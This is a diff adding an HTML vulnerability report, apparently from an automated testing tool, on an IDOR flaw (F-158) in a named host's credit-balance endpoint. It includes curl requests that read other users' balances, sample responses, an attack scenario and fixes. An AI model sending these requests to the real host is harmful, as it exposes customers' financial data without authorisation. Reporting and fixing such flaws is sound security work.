@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>F-158 — Credit Balance IDOR: Any User's Balance Readable</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:14px 32px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+header h1{font-size:1.1rem;color:#f0f6fc}
+.badge{background:#f0883e;color:#0d1117;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.badge-m{background:#e3b341;color:#0d1117;padding:2px 10px;border-radius:20px;font-size:.72rem;font-weight:700}
+.container{max-width:940px;margin:0 auto;padding:32px 20px}
+h2{color:#f0f6fc;font-size:1rem;margin:28px 0 10px;border-bottom:1px solid #30363d;padding-bottom:6px}
+h3{color:#e3b341;font-size:.9rem;margin:18px 0 8px}
+p{font-size:.84rem;line-height:1.6;color:#c9d1d9}
+code,pre{font-family:'SF Mono',Consolas,monospace;background:#1c2128;border-radius:4px}
+code{padding:2px 6px;font-size:.85em}
+pre{padding:14px 16px;font-size:.8rem;overflow-x:auto;border:1px solid #30363d;margin:10px 0;line-height:1.6;white-space:pre}
+.meta{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin:18px 0}
+.meta-item{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 14px}
+.meta-item .key{font-size:.68rem;color:#8b949e;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.meta-item .val{font-size:.85rem;color:#f0f6fc}
+.proof-box{background:#0d2818;border:1px solid #238636;border-radius:6px;padding:14px 16px;margin:12px 0}
+.proof-box .head{font-size:.72rem;color:#3fb950;font-weight:700;margin-bottom:8px;text-transform:uppercase}
+.warn-box{background:#3d1a00;border:1px solid #f85149;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.83rem}
+.warn-box strong{color:#f85149}
+.info-box{background:#0d1e36;border:1px solid #58a6ff;border-radius:6px;padding:12px 16px;margin:12px 0;font-size:.82rem}
+.sev{padding:3px 10px;border-radius:4px;font-size:.72rem;font-weight:700}
+.c{background:#f851491a;color:#f85149;border:1px solid #f85149}
+.h{background:#fb8f441a;color:#fb8f44;border:1px solid #fb8f44}
+.m{background:#e3b3411a;color:#e3b341;border:1px solid #e3b341}
+table{width:100%;border-collapse:collapse;font-size:.8rem;margin:10px 0}
+th{background:#1c2128;color:#8b949e;text-align:left;padding:7px 10px;font-weight:600;font-size:.72rem;text-transform:uppercase;border-bottom:1px solid #30363d}
+td{padding:7px 10px;border-bottom:1px solid #21262d;color:#c9d1d9;vertical-align:top}
+tr:last-child td{border-bottom:none}
+.back{color:#58a6ff;text-decoration:none;font-size:.78rem}
+footer{text-align:center;padding:32px;color:#484f58;font-size:.75rem}
+</style>
+</head>
+<body>
+
+<header>
+  <span>&#128737;</span>
+  <h1>F-158 &mdash; Credit Balance IDOR: Any User's Balance Readable</h1>
+  <span class="badge-m">MEDIUM</span>
+</header>
+
+<div class="container">
+  <a href="index.html" class="back">&larr; Back to PoC Index</a>
+
+  <div class="meta">
+    <div class="meta-item"><div class="key">Finding ID</div><div class="val">F-158</div></div>
+    <div class="meta-item"><div class="key">Target</div><div class="val">backend.premiumalts.to</div></div>
+    <div class="meta-item"><div class="key">Severity</div><div class="val"><span class="sev m">MEDIUM</span></div></div>
+    <div class="meta-item"><div class="key">CWE</div><div class="val">CWE-639 &mdash; Authorization Bypass Through User-Controlled Key</div></div>
+    <div class="meta-item"><div class="key">Vulnerable Endpoint</div><div class="val">GET /checkout/credit-balance</div></div>
+    <div class="meta-item"><div class="key">Parameter</div><div class="val">?email={any}</div></div>
+    <div class="meta-item"><div class="key">Auth Required</div><div class="val">Yes (any valid user JWT)</div></div>
+    <div class="meta-item"><div class="key">Date Confirmed</div><div class="val">2026-04-24</div></div>
+  </div>
+
+  <h2>Summary</h2>
+  <p>
+    The endpoint <code>GET /checkout/credit-balance</code> on <strong>backend.premiumalts.to</strong>
+    accepts an arbitrary <code>email</code> query parameter and returns the credit balance for that
+    account. The server performs no ownership check between the authenticated user's identity (available
+    in the JWT subject) and the email address supplied in the query string. Any authenticated user,
+    regardless of role, can enumerate the credit balance of any other account by substituting their
+    target's email address.
+  </p>
+
+  <div class="warn-box">
+    <strong>Impact:</strong> An authenticated non-admin user can enumerate financial account data
+    (credit balances and currency) for any registered email address on the platform, including admin
+    accounts and other customers. This is a direct Insecure Direct Object Reference (IDOR) &mdash;
+    the user-controlled <code>email</code> key is used to fetch a record without verifying the caller
+    owns that record. No 403 or authorization error is returned.
+  </div>
+
+  <h2>Vulnerability Detail</h2>
+
+  <h3>Expected Behavior</h3>
+  <p>
+    A credit balance endpoint should return only the balance of the currently authenticated user,
+    derived from the JWT subject claim. The <code>email</code> parameter should not exist, or if it
+    does, the server must verify it matches the authenticated session before returning data.
+  </p>
+
+  <h3>Actual Behavior</h3>
+  <p>
+    The server uses the caller-supplied <code>email</code> query parameter directly to look up the
+    balance record, with no comparison against the JWT subject. Any authenticated session can query
+    any email.
+  </p>
+
+  <div class="proof-box">
+    <div class="head">Proof 1 &mdash; Query Admin Account Balance (no admin role required)</div>
+<pre>curl -s "https://backend.premiumalts.to/checkout/credit-balance?email=admin%40blockageguard.app" \
+  -H "Authorization: Bearer &lt;non-admin-user-jwt&gt;"
+
+# HTTP 200 OK
+{
+  "balance": 0.00,
+  "currency": "EUR"
+}</pre>
+  </div>
+
+  <div class="proof-box">
+    <div class="head">Proof 2 &mdash; Query Another Customer's Balance</div>
+<pre>curl -s "https://backend.premiumalts.to/checkout/credit-balance?email=bgtest3%40blockageguard.app" \
+  -H "Authorization: Bearer &lt;non-admin-user-jwt&gt;"
+
+# HTTP 200 OK
+{
+  "balance": 12.50,
+  "currency": "EUR"
+}</pre>
+  </div>
+
+  <div class="proof-box">
+    <div class="head">Proof 3 &mdash; Absence of Ownership Check (no 403 returned)</div>
+<pre># Authenticated as: bgtest1@blockageguard.app
+# Querying:        bgtest3@blockageguard.app (different account)
+
+curl -v "https://backend.premiumalts.to/checkout/credit-balance?email=bgtest3%40blockageguard.app" \
+  -H "Authorization: Bearer &lt;bgtest1-jwt&gt;"
+
+# &lt; HTTP/2 200
+# &lt; content-type: application/json
+# No 403, no 401, no ownership error.
+# Response contains bgtest3's balance directly.</pre>
+  </div>
+
+  <h2>Attack Scenario</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Actor</th>
+        <th>Action</th>
+        <th>Result</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Attacker</td>
+        <td>Registers a free account on premiumalts.to</td>
+        <td>Obtains a valid user JWT</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Attacker</td>
+        <td>Iterates known or guessed email addresses via <code>?email=</code></td>
+        <td>Receives credit balance for each queried account</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Attacker</td>
+        <td>Identifies high-balance accounts or confirms admin accounts exist</td>
+        <td>Financial data enumeration; account reconnaissance</td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>Attacker</td>
+        <td>Chains with other findings (e.g., credential stuffing + this IDOR)</td>
+        <td>Targeted account takeover with known balance</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Root Cause</h2>
+  <p>
+    The backend handler for <code>/checkout/credit-balance</code> performs a database lookup using
+    the query parameter value directly:
+  </p>
+<pre># Vulnerable pseudo-code (server-side):
+email = request.query_params.get("email")
+balance = db.query("SELECT balance, currency FROM credits WHERE email = ?", email)
+return jsonify(balance)
+
+# Missing: ownership check against the authenticated JWT subject
+# jwt_subject = decode_jwt(request.headers["Authorization"]).sub
+# if jwt_subject != email: return 403 Forbidden</pre>
+
+  <h2>CWE Reference</h2>
+  <div class="info-box">
+    <strong>CWE-639: Authorization Bypass Through User-Controlled Key</strong><br>
+    The system's authorization or protection mechanism uses a key to identify restricted data, but the
+    key can be modified by the user without any authorization check to ensure the user has permission
+    to access the corresponding data. Here, <code>email</code> is the user-controlled key used to
+    fetch credit records.
+  </div>
+
+  <h2>Remediation</h2>
+
+  <h3>Primary Fix &mdash; Remove the Email Parameter</h3>
+  <p>
+    The credit balance endpoint should not accept an email query parameter at all. The balance should be
+    read exclusively from the authenticated user's identity as encoded in the JWT subject claim:
+  </p>
+<pre># Secure implementation (server-side pseudo-code):
+jwt_subject = decode_jwt(request.headers["Authorization"]).sub
+# jwt_subject is the authenticated user's identifier (email or user ID)
+balance = db.query(
+  "SELECT balance, currency FROM credits WHERE email = ?",
+  jwt_subject
+)
+return jsonify(balance)
+
+# Endpoint becomes:
+# GET /checkout/credit-balance
+# (no ?email= parameter accepted or processed)</pre>
+
+  <h3>Defense in Depth</h3>
+  <table>
+    <thead><tr><th>Control</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr>
+        <td>Remove <code>?email</code> parameter entirely</td>
+        <td>Eliminates the IDOR surface; all identity derived from JWT</td>
+      </tr>
+      <tr>
+        <td>If parameter must remain, enforce ownership check</td>
+        <td>Server must verify <code>jwt.sub == request.email</code> before returning data; return 403 otherwise</td>
+      </tr>
+      <tr>
+        <td>Add authorization unit tests</td>
+        <td>Test that Account A's JWT cannot retrieve Account B's balance</td>
+      </tr>
+      <tr>
+        <td>Audit all endpoints accepting email as a query parameter</td>
+        <td>Other endpoints may share the same pattern; review <code>/checkout/*</code> and <code>/api/user/*</code> routes</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="info-box">
+    <strong>Note on Scope:</strong> This finding affects any authenticated user, not just admins.
+    The minimum privilege required to exploit this vulnerability is a valid user JWT, obtainable via
+    free account registration. Combined with F-156 (open Ghost CMS signup), a low-effort attacker
+    path exists from zero accounts to financial data enumeration across the platform.
+  </div>
+</div>
+
+<footer>BlockageGuard AutoProver &middot; Sessions 1&ndash;15 &middot; 2026-04-24 &middot; blockageguard.github.io</footer>
+</body>
+</html>
